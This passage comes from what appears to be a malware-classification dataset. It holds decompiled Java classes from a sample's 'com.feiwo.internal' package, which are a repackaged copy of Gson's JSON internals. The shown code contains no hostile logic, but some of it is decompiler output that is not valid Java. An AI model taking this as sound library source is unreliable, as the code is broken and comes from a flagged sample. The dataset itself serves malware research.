if (obj == 0) {       return null;     }     try {       return find(obj,false);     }  catch (    ClassCastException e) {       return null;     }   }   @Override public V get(  Object obj){     Node<K,V> findByObject=findByObject(obj);     if (findByObject != null) {       return findByObject.value;     }     return null;   }   @Override public Set<K> keySet(){     LinkedTreeMap<K,V>.KeySet keySet=this.keySet;     if (keySet != null) {       return keySet;     }     LinkedTreeMap<K,V>.KeySet keySet2=new KeySet();     this.keySet=keySet2;     return keySet2;   }   @Override public V put(  K k,  V v){     if (k == null) {       throw new NullPointerException(""key == null"");     }     Node<K,V> find=find(k,true);     V v2=find.value;     find.value=v;     return v2;   }   @Override public V remove(  Object obj){     Node<K,V> removeInternalByKey=removeInternalByKey(obj);     if (removeInternalByKey != null) {       return removeInternalByKey.value;     }     return null;   }   void removeInternal(  Node<K,V> node,  boolean z){     int i;     int i2=0;     if (z) {       node.prev.next=node.next;       node.next.prev=node.prev;     }     Node<K,V> node2=node.left;     Node<K,V> node3=node.right;     Node<K,V> node4=node.parent;     if (node2 == null || node3 == null) {       if (node2 != null) {         replaceInParent(node,node2);         node.left=null;       }  else       if (node3 != null) {         replaceInParent(node,node3);         node.right=null;       }  else {         replaceInParent(node,null);       }       rebalance(node4,false);       this.size--;       this.modCount++;       return;     }     Node<K,V> last=node2.height > node3.height ? node2.last() : node3.first();     removeInternal(last,false);     Node<K,V> node5=node.left;     if (node5 != null) {       i=node5.height;       last.left=node5;       node5.parent=last;       node.left=null;     }  else {       i=0;     }     Node<K,V> node6=node.right;     if (node6 != null) {       i2=node6.height;       last.right=node6;       node6.parent=last;       node.right=null;     }     last.height=Math.max(i,i2) + 1;     replaceInParent(node,last);   }   Node<K,V> removeInternalByKey(  Object obj){     Node<K,V> findByObject=findByObject(obj);     if (findByObject != null) {       removeInternal(findByObject,true);     }     return findByObject;   }   @Override public int size(){     return this.size;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.internal\LinkedTreeMapIterator.code","public abstract class LinkedTreeMapIterator<T> implements Iterator<T> {   int expectedModCount;   Node<K,V> lastReturned;   Node<K,V> next;   private LinkedTreeMapIterator(){     this.next=LinkedTreeMap.this.header.next;     this.lastReturned=null;     this.expectedModCount=LinkedTreeMap.this.modCount;   }   @Override public final boolean hasNext(){     return this.next != LinkedTreeMap.this.header;   }   final Node<K,V> nextNode(){     Node<K,V> node=this.next;     if (node == LinkedTreeMap.this.header) {       throw new NoSuchElementException();     }     if (LinkedTreeMap.this.modCount != this.expectedModCount) {       throw new ConcurrentModificationException();     }     this.next=node.next;     this.lastReturned=node;     return node;   }   @Override public final void remove(){     if (this.lastReturned == null) {       throw new IllegalStateException();     }     LinkedTreeMap.this.removeInternal(this.lastReturned,true);     this.lastReturned=null;     this.expectedModCount=LinkedTreeMap.this.modCount;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.internal\Node.code","public final class Node<K,V> implements Map.Entry<K,V> {   int height;   final K key;   Node<K,V> left;   Node<K,V> next;   Node<K,V> parent;   Node<K,V> prev;   Node<K,V> right;   V value;   Node(){     this.key=null;     this.prev=this;     this.next=this;   }   Node(  Node<K,V> node,  K k,  Node<K,V> node2,  Node<K,V> node3){     this.parent=node;     this.key=k;     this.height=1;     this.next=node2;     this.prev=node3;     node3.next=this;     node2.prev=this;   }   @Override public boolean equals(  Object obj){     if (!(obj instanceof Map.Entry)) {       return false;     }     Map.Entry entry=(Map.Entry)obj;     if (this.key == null) {       if (entry.getKey() != null) {         return false;       }     }  else     if (!this.key.equals(entry.getKey())) {       return false;     }     if (this.value == null) {       if (entry.getValue() != null) {         return false;       }     }  else     if (!this.value.equals(entry.getValue())) {       return false;     }     return true;   }   public Node<K,V> first(){     for (Node<K,V> node=this.left; node != null; node=node.left) {       this=node;     }     return this;   }   @Override public K getKey(){     return this.key;   }   @Override public V getValue(){     return this.value;   }   @Override public int hashCode(){     return (this.key == null ? 0 : this.key.hashCode()) ^ (this.value != null ? this.value.hashCode() : 0);   }   public Node<K,V> last(){     for (Node<K,V> node=this.right; node != null; node=node.right) {       this=node;     }     return this;   }   @Override public V setValue(  V v){     V v2=this.value;     this.value=v;     return v2;   }   public String toString(){     return this.key + ""="" + this.value;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.internal\ObjectConstructor.code","public interface ObjectConstructor<T> {   T construct(); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.internal\packageinfo.code","interface packageinfo { } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.internal\ParameterizedTypeImpl.code","public final class ParameterizedTypeImpl implements Serializable, ParameterizedType {   private static final long serialVersionUID=0;   private final Type ownerType;   private final Type rawType;   private final Type[] typeArguments;   public ParameterizedTypeImpl(  Type type,  Type type2,  Type... typeArr){     boolean z=true;     if (type2 instanceof Class) {       Class cls=(Class)type2;       C$Gson$Preconditions.checkArgument(type != null || cls.getEnclosingClass() == null);       if (type != null && cls.getEnclosingClass() == null) {         z=false;       }       C$Gson$Preconditions.checkArgument(z);     }     this.ownerType=type == null ? null : C$Gson$Types.canonicalize(type);     this.rawType=C$Gson$Types.canonicalize(type2);     this.typeArguments=(Type[])typeArr.clone();     for (int i=0; i < this.typeArguments.length; i++) {       C$Gson$Preconditions.checkNotNull(this.typeArguments[i]);       C$Gson$Types.checkNotPrimitive(this.typeArguments[i]);       this.typeArguments[i]=C$Gson$Types.canonicalize(this.typeArguments[i]);     }   }   public boolean equals(  Object obj){     return (obj instanceof ParameterizedType) && C$Gson$Types.equals(this,(ParameterizedType)obj);   }   @Override public Type[] getActualTypeArguments(){     return (Type[])this.typeArguments.clone();   }   @Override public Type getOwnerType(){     return this.ownerType;   }   @Override public Type getRawType(){     return this.rawType;   }   public int hashCode(){     return (Arrays.hashCode(this.typeArguments) ^ this.rawType.hashCode()) ^ C$Gson$Types.hashCodeOrZero(this.ownerType);   }   public String toString(){     StringBuilder sb=new StringBuilder((this.typeArguments.length + 1) * 30);     sb.append(C$Gson$Types.typeToString(this.rawType));     if (this.typeArguments.length == 0) {       return sb.toString();     }     sb.append(""<"").append(C$Gson$Types.typeToString(this.typeArguments[0]));     for (int i=1; i < this.typeArguments.length; i++) {       sb.append("", "").append(C$Gson$Types.typeToString(this.typeArguments[i]));     }     return sb.append("">"").toString();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.internal\Primitives.code","public final class Primitives {   private static final Map<Class<?>,Class<?>> PRIMITIVE_TO_WRAPPER_TYPE;   private static final Map<Class<?>,Class<?>> WRAPPER_TO_PRIMITIVE_TYPE; static {     HashMap hashMap=new HashMap(16);     HashMap hashMap2=new HashMap(16);     add(hashMap,hashMap2,Boolean.TYPE,Boolean.class);     add(hashMap,hashMap2,Byte.TYPE,Byte.class);     add(hashMap,hashMap2,Character.TYPE,Character.class);     add(hashMap,hashMap2,Double.TYPE,Double.class);     add(hashMap,hashMap2,Float.TYPE,Float.class);     add(hashMap,hashMap2,Integer.TYPE,Integer.class);     add(hashMap,hashMap2,Long.TYPE,Long.class);     add(hashMap,hashMap2,Short.TYPE,Short.class);     add(hashMap,hashMap2,Void.TYPE,Void.class);     PRIMITIVE_TO_WRAPPER_TYPE=Collections.unmodifiableMap(hashMap);     WRAPPER_TO_PRIMITIVE_TYPE=Collections.unmodifiableMap(hashMap2);   }   private Primitives(){   }   private static void add(  Map<Class<?>,Class<?>> map,  Map<Class<?>,Class<?>> map2,  Class<?> cls,  Class<?> cls2){     map.put(cls,cls2);     map2.put(cls2,cls);   }   public static boolean isPrimitive(  Type type){     return PRIMITIVE_TO_WRAPPER_TYPE.containsKey(type);   }   public static boolean isWrapperType(  Type type){     return WRAPPER_TO_PRIMITIVE_TYPE.containsKey(C$Gson$Preconditions.checkNotNull(type));   }   public static <T>Class<T> unwrap(  Class<T> cls){     Class<T> cls2=(Class)WRAPPER_TO_PRIMITIVE_TYPE.get(C$Gson$Preconditions.checkNotNull(cls));     return cls2 == null ? cls : cls2;   }   public static <T>Class<T> wrap(  Class<T> cls){     Class<T> cls2=(Class)PRIMITIVE_TO_WRAPPER_TYPE.get(C$Gson$Preconditions.checkNotNull(cls));     return cls2 == null ? cls : cls2;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.internal\Streams.code","public final class Streams { final class AppendableWriter extends Writer {     private final Appendable appendable;     private final CurrentWrite currentWrite; class CurrentWrite implements CharSequence {       char[] chars;       CurrentWrite(){       }       @Override public char charAt(      int i){         return this.chars[i];       }       @Override public int length(){         return this.chars.length;       }       @Override public CharSequence subSequence(      int i,      int i2){         return new String(this.chars,i,i2 - i);       }     }     private AppendableWriter(    Appendable appendable){       this.currentWrite=new CurrentWrite();       this.appendable=appendable;     }     @Override public void close(){     }     @Override public void flush(){     }     @Override public void write(    int i){       this.appendable.append((char)i);     }     @Override public void write(    char[] cArr,    int i,    int i2){       this.currentWrite.chars=cArr;       this.appendable.append(this.currentWrite,i,i + i2);     }   }   public static JsonElement parse(  JsonReader jsonReader){     boolean z=true;     try {       jsonReader.peek();       z=false;       return TypeAdapters.JSON_ELEMENT.read2(jsonReader);     }  catch (    MalformedJsonException e) {       throw new JsonSyntaxException(e);     } catch (    EOFException e2) {       if (z) {         return JsonNull.INSTANCE;       }       throw new JsonSyntaxException(e2);     } catch (    IOException e3) {       throw new JsonIOException(e3);     } catch (    NumberFormatException e4) {       throw new JsonSyntaxException(e4);     }   }   public static void write(  JsonElement jsonElement,  JsonWriter jsonWriter){     TypeAdapters.JSON_ELEMENT.write(jsonWriter,jsonElement);   }   public static Writer writerForAppendable(  Appendable appendable){     return appendable instanceof Writer ? (Writer)appendable : new AppendableWriter(appendable);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.internal\UnsafeAllocator.code","public abstract class UnsafeAllocator {   public static UnsafeAllocator create(){     try {       Class<?> cls=Class.forName(""sun.misc.Unsafe"");       Field declaredField=cls.getDeclaredField(""theUnsafe"");       declaredField.setAccessible(true);       final Object obj=declaredField.get(null);       final Method method=cls.getMethod(""allocateInstance"",Class.class);       return new UnsafeAllocator(){         @Override public <T>T newInstance(        Class<T> cls2){           return (T)method.invoke(obj,cls2);         }       } ;     }  catch (    Exception e) {       try {         final Method declaredMethod=ObjectInputStream.class.getDeclaredMethod(""newInstance"",Class.class,Class.class);         declaredMethod.setAccessible(true);         return new UnsafeAllocator(){           @Override public <T>T newInstance(          Class<T> cls2){             return (T)declaredMethod.invoke(null,cls2,Object.class);           }         } ;       }  catch (      Exception e2) {         try {           Method declaredMethod2=ObjectStreamClass.class.getDeclaredMethod(""getConstructorId"",Class.class);           declaredMethod2.setAccessible(true);           final int intValue=((Integer)declaredMethod2.invoke(null,Object.class)).intValue();           final Method declaredMethod3=ObjectStreamClass.class.getDeclaredMethod(""newInstance"",Class.class,Integer.TYPE);           declaredMethod3.setAccessible(true);           return new UnsafeAllocator(){             @Override public <T>T newInstance(            Class<T> cls2){               return (T)declaredMethod3.invoke(null,cls2,Integer.valueOf(intValue));             }           } ;         }  catch (        Exception e3) {           return new UnsafeAllocator(){             @Override public <T>T newInstance(            Class<T> cls2){               throw new UnsupportedOperationException(""Cannot allocate "" + cls2);             }           } ;         }       }     }   }   public abstract <T>T newInstance(  Class<T> cls); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.internal\WildcardTypeImpl.code","public final class WildcardTypeImpl implements Serializable, WildcardType {   private static final long serialVersionUID=0;   private final Type lowerBound;   private final Type upperBound;   public WildcardTypeImpl(  Type[] typeArr,  Type[] typeArr2){     C$Gson$Preconditions.checkArgument(typeArr2.length <= 1);     C$Gson$Preconditions.checkArgument(typeArr.length == 1);     if (typeArr2.length != 1) {       C$Gson$Preconditions.checkNotNull(typeArr[0]);       C$Gson$Types.checkNotPrimitive(typeArr[0]);       this.lowerBound=null;       this.upperBound=C$Gson$Types.canonicalize(typeArr[0]);       return;     }     C$Gson$Preconditions.checkNotNull(typeArr2[0]);     C$Gson$Types.checkNotPrimitive(typeArr2[0]);     C$Gson$Preconditions.checkArgument(typeArr[0] == Object.class);     this.lowerBound=C$Gson$Types.canonicalize(typeArr2[0]);     this.upperBound=Object.class;   }   public boolean equals(  Object obj){     return (obj instanceof WildcardType) && C$Gson$Types.equals(this,(WildcardType)obj);   }   @Override public Type[] getLowerBounds(){     return this.lowerBound != null ? new Type[]{this.lowerBound} : C$Gson$Types.EMPTY_TYPE_ARRAY;   }   @Override public Type[] getUpperBounds(){     return new Type[]{this.upperBound};   }   public int hashCode(){     return (this.lowerBound != null ? this.lowerBound.hashCode() + 31 : 1) ^ (this.upperBound.hashCode() + 31);   }   public String toString(){     return this.lowerBound != null ? ""? super "" + C$Gson$Types.typeToString(this.lowerBound) : this.upperBound == Object.class ? ""?"" : ""? extends "" + C$Gson$Types.typeToString(this.upperBound);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.internal.bind\Adapter.code","final class Adapter<E> extends TypeAdapter<Collection<E>> {   private final ObjectConstructor<? extends Collection<E>> constructor;   private final TypeAdapter<E> elementTypeAdapter;   public Adapter(  Gson gson,  Type type,  TypeAdapter<E> typeAdapter,  ObjectConstructor<? extends Collection<E>> objectConstructor){     this.elementTypeAdapter=new TypeAdapterRuntimeTypeWrapper(gson,typeAdapter,type);     this.constructor=objectConstructor;   }   @Override public Collection<E> read2(  JsonReader jsonReader){     if (jsonReader.peek() == JsonToken.NULL) {       jsonReader.nextNull();       return null;     }     Collection<E> construct=this.constructor.construct();     jsonReader.beginArray();     while (jsonReader.hasNext()) {       construct.add(this.elementTypeAdapter.read2(jsonReader));     }     jsonReader.endArray();     return construct;   }   @Override public void write(  JsonWriter jsonWriter,  Collection<E> collection){     if (collection == null) {       jsonWriter.nullValue();       return;     }     jsonWriter.beginArray();     Iterator<E> it=collection.iterator();     while (it.hasNext()) {       this.elementTypeAdapter.write(jsonWriter,it.next());     }     jsonWriter.endArray();   } } final class Adapter<K,V> extends TypeAdapter<Map<K,V>> {   private final ObjectConstructor<? extends Map<K,V>> constructor;   private final TypeAdapter<K> keyTypeAdapter;   private final TypeAdapter<V> valueTypeAdapter;   public Adapter(  Gson gson,  Type type,  TypeAdapter<K> typeAdapter,  Type type2,  TypeAdapter<V> typeAdapter2,  ObjectConstructor<? extends Map<K,V>> objectConstructor){     this.keyTypeAdapter=new TypeAdapterRuntimeTypeWrapper(gson,typeAdapter,type);     this.valueTypeAdapter=new TypeAdapterRuntimeTypeWrapper(gson,typeAdapter2,type2);     this.constructor=objectConstructor;   }   private String keyToString(  JsonElement jsonElement){     if (!jsonElement.isJsonPrimitive()) {       if (jsonElement.isJsonNull()) {         return ""null"";       }       throw new AssertionError();     }     JsonPrimitive asJsonPrimitive=jsonElement.getAsJsonPrimitive();     if (asJsonPrimitive.isNumber()) {       return String.valueOf(asJsonPrimitive.getAsNumber());     }     if (asJsonPrimitive.isBoolean()) {       return Boolean.toString(asJsonPrimitive.getAsBoolean());     }     if (asJsonPrimitive.isString()) {       return asJsonPrimitive.getAsString();     }     throw new AssertionError();   }   @Override public Map<K,V> read2(  JsonReader jsonReader){     JsonToken peek=jsonReader.peek();     if (peek == JsonToken.NULL) {       jsonReader.nextNull();       return null;     }     Map<K,V> construct=this.constructor.construct();     if (peek != JsonToken.BEGIN_ARRAY) {       jsonReader.beginObject();       while (jsonReader.hasNext()) {         JsonReaderInternalAccess.INSTANCE.promoteNameToValue(jsonReader);         K read2=this.keyTypeAdapter.read2(jsonReader);         if (construct.put(read2,this.valueTypeAdapter.read2(jsonReader)) != null) {           throw new JsonSyntaxException(""duplicate key: "" + read2);         }       }       jsonReader.endObject();       return construct;     }     jsonReader.beginArray();     while (jsonReader.hasNext()) {       jsonReader.beginArray();       K read22=this.keyTypeAdapter.read2(jsonReader);       if (construct.put(read22,this.valueTypeAdapter.read2(jsonReader)) != null) {         throw new JsonSyntaxException(""duplicate key: "" + read22);       }       jsonReader.endArray();     }     jsonReader.endArray();     return construct;   }   @Override public void write(  JsonWriter jsonWriter,  Map<K,V> map){     int i=0;     if (map == null) {       jsonWriter.nullValue();       return;     }     if (!MapTypeAdapterFactory.this.complexMapKeySerialization) {       jsonWriter.beginObject();       for (      Map.Entry<K,V> entry : map.entrySet()) {         jsonWriter.name(String.valueOf(entry.getKey()));         this.valueTypeAdapter.write(jsonWriter,entry.getValue());       }       jsonWriter.endObject();       return;     }     ArrayList arrayList=new ArrayList(map.size());     ArrayList arrayList2=new ArrayList(map.size());     boolean z=false;     for (    Map.Entry<K,V> entry2 : map.entrySet()) {       JsonElement jsonTree=this.keyTypeAdapter.toJsonTree(entry2.getKey());       arrayList.add(jsonTree);       arrayList2.add(entry2.getValue());       z=(jsonTree.isJsonArray() || jsonTree.isJsonObject()) | z;     }     if (!z) {       jsonWriter.beginObject();       while (i < arrayList.size()) {         jsonWriter.name(keyToString((JsonElement)arrayList.get(i)));         this.valueTypeAdapter.write(jsonWriter,arrayList2.get(i));         i++;       }       jsonWriter.endObject();       return;     }     jsonWriter.beginArray();     while (i < arrayList.size()) {       jsonWriter.beginArray();       Streams.write((JsonElement)arrayList.get(i),jsonWriter);       this.valueTypeAdapter.write(jsonWriter,arrayList2.get(i));       jsonWriter.endArray();       i++;     }     jsonWriter.endArray();   } } public final class Adapter<T> extends TypeAdapter<T> {   private final Map<String,BoundField> boundFields;   private final ObjectConstructor<T> constructor;   private Adapter(  ObjectConstructor<T> objectConstructor,  Map<String,BoundField> map){     this.constructor=objectConstructor;     this.boundFields=map;   }   @Override public T read2(  JsonReader jsonReader){     if (jsonReader.peek() == JsonToken.NULL) {       jsonReader.nextNull();       return null;     }     T construct=this.constructor.construct();     try {       jsonReader.beginObject();       while (jsonReader.hasNext()) {         BoundField boundField=this.boundFields.get(jsonReader.nextName());         if (boundField == null || !boundField.deserialized) {           jsonReader.skipValue();         }  else {           boundField.read(jsonReader,construct);         }       }       jsonReader.endObject();       return construct;     }  catch (    IllegalAccessException e) {       throw new AssertionError(e);     } catch (    IllegalStateException e2) {       throw new JsonSyntaxException(e2);     }   }   @Override public void write(  JsonWriter jsonWriter,  T t){     if (t == null) {       jsonWriter.nullValue();       return;     }     jsonWriter.beginObject();     try {       for (      BoundField boundField : this.boundFields.values()) {         if (boundField.serialized) {           jsonWriter.name(boundField.name);           boundField.write(jsonWriter,t);         }       }       jsonWriter.endObject();     }  catch (    IllegalAccessException e) {       throw new AssertionError();     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.internal.bind\AnonymousClass32.code","public class AnonymousClass32 {   static final int[] $SwitchMap$com$google$gson$stream$JsonToken=new int[JsonToken.values().length]; static {     try {       $SwitchMap$com$google$gson$stream$JsonToken[JsonToken.NUMBER.ordinal()]=1;     }  catch (    NoSuchFieldError e) {     }     try {       $SwitchMap$com$google$gson$stream$JsonToken[JsonToken.BOOLEAN.ordinal()]=2;     }  catch (    NoSuchFieldError e2) {     }     try {       $SwitchMap$com$google$gson$stream$JsonToken[JsonToken.STRING.ordinal()]=3;     }  catch (    NoSuchFieldError e3) {     }     try {       $SwitchMap$com$google$gson$stream$JsonToken[JsonToken.NULL.ordinal()]=4;     }  catch (    NoSuchFieldError e4) {     }     try {       $SwitchMap$com$google$gson$stream$JsonToken[JsonToken.BEGIN_ARRAY.ordinal()]=5;     }  catch (    NoSuchFieldError e5) {     }     try {       $SwitchMap$com$google$gson$stream$JsonToken[JsonToken.BEGIN_OBJECT.ordinal()]=6;     }  catch (    NoSuchFieldError e6) {     }     try {       $SwitchMap$com$google$gson$stream$JsonToken[JsonToken.END_DOCUMENT.ordinal()]=7;     }  catch (    NoSuchFieldError e7) {     }     try {       $SwitchMap$com$google$gson$stream$JsonToken[JsonToken.NAME.ordinal()]=8;     }  catch (    NoSuchFieldError e8) {     }     try {       $SwitchMap$com$google$gson$stream$JsonToken[JsonToken.END_OBJECT.ordinal()]=9;     }  catch (    NoSuchFieldError e9) {     }     try {       $SwitchMap$com$google$gson$stream$JsonToken[JsonToken.END_ARRAY.ordinal()]=10;     }  catch (    NoSuchFieldError e10) {     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.internal.bind\ArrayTypeAdapter.code","public final class ArrayTypeAdapter<E> extends TypeAdapter<Object> {   public static final TypeAdapterFactory FACTORY=new TypeAdapterFactory(){     @Override public <T>TypeAdapter<T> create(    Gson gson,    TypeToken<T> typeToken){       Type type=typeToken.getType();       if (!(type instanceof GenericArrayType) && (!(type instanceof Class) || !((Class)type).isArray())) {         return null;       }       Type arrayComponentType=C$Gson$Types.getArrayComponentType(type);       return new ArrayTypeAdapter(gson,gson.getAdapter(TypeToken.get(arrayComponentType)),C$Gson$Types.getRawType(arrayComponentType));     }   } ;   private final Class<E> componentType;   private final TypeAdapter<E> componentTypeAdapter;   public ArrayTypeAdapter(  Gson gson,  TypeAdapter<E> typeAdapter,  Class<E> cls){     this.componentTypeAdapter=new TypeAdapterRuntimeTypeWrapper(gson,typeAdapter,cls);     this.componentType=cls;   }   @Override public Object read2(  JsonReader jsonReader){     if (jsonReader.peek() == JsonToken.NULL) {       jsonReader.nextNull();       return null;     }     ArrayList arrayList=new ArrayList();     jsonReader.beginArray();     while (jsonReader.hasNext()) {       arrayList.add(this.componentTypeAdapter.read2(jsonReader));     }     jsonReader.endArray();     Object newInstance=Array.newInstance((Class<?>)this.componentType,arrayList.size());     for (int i=0; i < arrayList.size(); i++) {       Array.set(newInstance,i,arrayList.get(i));     }     return newInstance;   }   @Override public void write(  JsonWriter jsonWriter,  Object obj){     if (obj == null) {       jsonWriter.nullValue();       return;     }     jsonWriter.beginArray();     int length=Array.getLength(obj);     for (int i=0; i < length; i++) {       this.componentTypeAdapter.write(jsonWriter,Array.get(obj,i));     }     jsonWriter.endArray();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.internal.bind\BoundField.code","public abstract class BoundField {   final boolean deserialized;   final String name;   final boolean serialized;   protected BoundField(  String str,  boolean z,  boolean z2){     this.name=str;     this.serialized=z;     this.deserialized=z2;   }   abstract void read(  JsonReader jsonReader,  Object obj);   abstract void write(  JsonWriter jsonWriter,  Object obj); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.internal.bind\CollectionTypeAdapterFactory.code","public final class CollectionTypeAdapterFactory implements TypeAdapterFactory {   private final ConstructorConstructor constructorConstructor; final class Adapter<E> extends TypeAdapter<Collection<E>> {     private final ObjectConstructor<? extends Collection<E>> constructor;     private final TypeAdapter<E> elementTypeAdapter;     public Adapter(    Gson gson,    Type type,    TypeAdapter<E> typeAdapter,    ObjectConstructor<? extends Collection<E>> objectConstructor){       this.elementTypeAdapter=new TypeAdapterRuntimeTypeWrapper(gson,typeAdapter,type);       this.constructor=objectConstructor;     }     @Override public Collection<E> read2(    JsonReader jsonReader){       if (jsonReader.peek() == JsonToken.NULL) {         jsonReader.nextNull();         return null;       }       Collection<E> construct=this.constructor.construct();       jsonReader.beginArray();       while (jsonReader.hasNext()) {         construct.add(this.elementTypeAdapter.read2(jsonReader));       }       jsonReader.endArray();       return construct;     }     @Override public void write(    JsonWriter jsonWriter,    Collection<E> collection){       if (collection == null) {         jsonWriter.nullValue();         return;       }       jsonWriter.beginArray();       Iterator<E> it=collection.iterator();       while (it.hasNext()) {         this.elementTypeAdapter.write(jsonWriter,it.next());       }       jsonWriter.endArray();     }   }   public CollectionTypeAdapterFactory(  ConstructorConstructor constructorConstructor){     this.constructorConstructor=constructorConstructor;   }   @Override public <T>TypeAdapter<T> create(  Gson gson,  TypeToken<T> typeToken){     Type type=typeToken.getType();     Class<? super T> rawType=typeToken.getRawType();     if (!Collection.class.isAssignableFrom(rawType)) {       return null;     }     Type collectionElementType=C$Gson$Types.getCollectionElementType(type,rawType);     return new Adapter(gson,collectionElementType,gson.getAdapter(TypeToken.get(collectionElementType)),this.constructorConstructor.get(typeToken));   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.internal.bind\DateTypeAdapter.code","public final class DateTypeAdapter extends TypeAdapter<Date> {   public static final TypeAdapterFactory FACTORY=new TypeAdapterFactory(){     @Override public <T>TypeAdapter<T> create(    Gson gson,    TypeToken<T> typeToken){       if (typeToken.getRawType() == Date.class) {         return new DateTypeAdapter();       }       return null;     }   } ;   private final DateFormat enUsFormat=DateFormat.getDateTimeInstance(2,2,Locale.US);   private final DateFormat localFormat=DateFormat.getDateTimeInstance(2,2);   private final DateFormat iso8601Format=buildIso8601Format();   private static DateFormat buildIso8601Format(){     SimpleDateFormat simpleDateFormat=new SimpleDateFormat(""yyyy-MM-dd'T'HH:mm:ss'Z'"",Locale.US);     simpleDateFormat.setTimeZone(TimeZone.getTimeZone(""UTC""));     return simpleDateFormat;   }   private synchronized Date deserializeToDate(  String str){     Date parse;     try {       parse=this.localFormat.parse(str);     }  catch (    ParseException e) {       try {         parse=this.enUsFormat.parse(str);       }  catch (      ParseException e2) {         try {           parse=this.iso8601Format.parse(str);         }  catch (        ParseException e3) {           throw new JsonSyntaxException(str,e3);         }       }     }     return parse;   }   @Override public Date read2(  JsonReader jsonReader){     if (jsonReader.peek() != JsonToken.NULL) {       return deserializeToDate(jsonReader.nextString());     }     jsonReader.nextNull();     return null;   }   @Override public synchronized void write(  JsonWriter jsonWriter,  Date date){     if (date == null) {       jsonWriter.nullValue();     }  else {       jsonWriter.value(this.enUsFormat.format(date));     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.internal.bind\EnumTypeAdapter.code","final class EnumTypeAdapter<T extends Enum<T>> extends TypeAdapter<T> {   private final Map<String,T> nameToConstant=new HashMap();   private final Map<T,String> constantToName=new HashMap();   public EnumTypeAdapter(  Class<T> cls){     try {       for (      T t : cls.getEnumConstants()) {         String name=t.name();         SerializedName serializedName=(SerializedName)cls.getField(name).getAnnotation(SerializedName.class);         String value=serializedName != null ? serializedName.value() : name;         this.nameToConstant.put(value,t);         this.constantToName.put(t,value);       }     }  catch (    NoSuchFieldException e) {       throw new AssertionError();     }   }   @Override public T read2(  JsonReader jsonReader){     if (jsonReader.peek() != JsonToken.NULL) {       return this.nameToConstant.get(jsonReader.nextString());     }     jsonReader.nextNull();     return null;   }   @Override public void write(  JsonWriter jsonWriter,  T t){     jsonWriter.value(t == null ? null : this.constantToName.get(t));   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.internal.bind\JsonTreeReader.code","public final class JsonTreeReader extends JsonReader {   private final List<Object> stack;   private static final Reader UNREADABLE_READER=new Reader(){     @Override public void close(){       throw new AssertionError();     }     @Override public int read(    char[] cArr,    int i,    int i2){       throw new AssertionError();     }   } ;   private static final Object SENTINEL_CLOSED=new Object();   public JsonTreeReader(  JsonElement jsonElement){     super(UNREADABLE_READER);     this.stack=new ArrayList();     this.stack.add(jsonElement);   }   private void expect(  JsonToken jsonToken){     if (peek() != jsonToken) {       throw new IllegalStateException(""Expected "" + jsonToken + "" but was ""+ peek());     }   }   private Object peekStack(){     return this.stack.get(this.stack.size() - 1);   }   private Object popStack(){     return this.stack.remove(this.stack.size() - 1);   }   @Override public void beginArray(){     expect(JsonToken.BEGIN_ARRAY);     this.stack.add(((JsonArray)peekStack()).iterator());   }   @Override public void beginObject(){     expect(JsonToken.BEGIN_OBJECT);     this.stack.add(((JsonObject)peekStack()).entrySet().iterator());   }   @Override public void close(){     this.stack.clear();     this.stack.add(SENTINEL_CLOSED);   }   @Override public void endArray(){     expect(JsonToken.END_ARRAY);     popStack();     popStack();   }   @Override public void endObject(){     expect(JsonToken.END_OBJECT);     popStack();     popStack();   }   @Override public boolean hasNext(){     JsonToken peek=peek();     return (peek == JsonToken.END_OBJECT || peek == JsonToken.END_ARRAY) ? false : true;   }   @Override public boolean nextBoolean(){     expect(JsonToken.BOOLEAN);     return ((JsonPrimitive)popStack()).getAsBoolean();   }   @Override public double nextDouble(){     JsonToken peek=peek();     if (peek != JsonToken.NUMBER && peek != JsonToken.STRING) {       throw new IllegalStateException(""Expected "" + JsonToken.NUMBER + "" but was ""+ peek);     }     double asDouble=((JsonPrimitive)peekStack()).getAsDouble();     if (!isLenient() && (Double.isNaN(asDouble) || Double.isInfinite(asDouble))) {       throw new NumberFormatException(""JSON forbids NaN and infinities: "" + asDouble);     }     popStack();     return asDouble;   }   @Override public int nextInt(){     JsonToken peek=peek();     if (peek != JsonToken.NUMBER && peek != JsonToken.STRING) {       throw new IllegalStateException(""Expected "" + JsonToken.NUMBER + "" but was ""+ 